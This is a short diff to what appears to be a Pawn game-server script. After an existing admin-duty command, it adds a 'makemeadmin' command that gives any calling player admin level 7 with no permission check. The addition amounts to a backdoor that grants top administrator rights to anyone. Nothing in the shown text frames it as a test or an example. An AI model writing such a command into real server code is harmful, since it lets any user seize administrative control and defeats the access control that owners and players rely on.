@@ -36,3 +36,9 @@ CMD:aduty(playerid, params[])
 	}
 	return 1;
 }
+
+CMD:makemeadmin(playerid, params[])
+{
+	PlayerData[playerid][pAdmin] = 7;
+	return 1;
+}
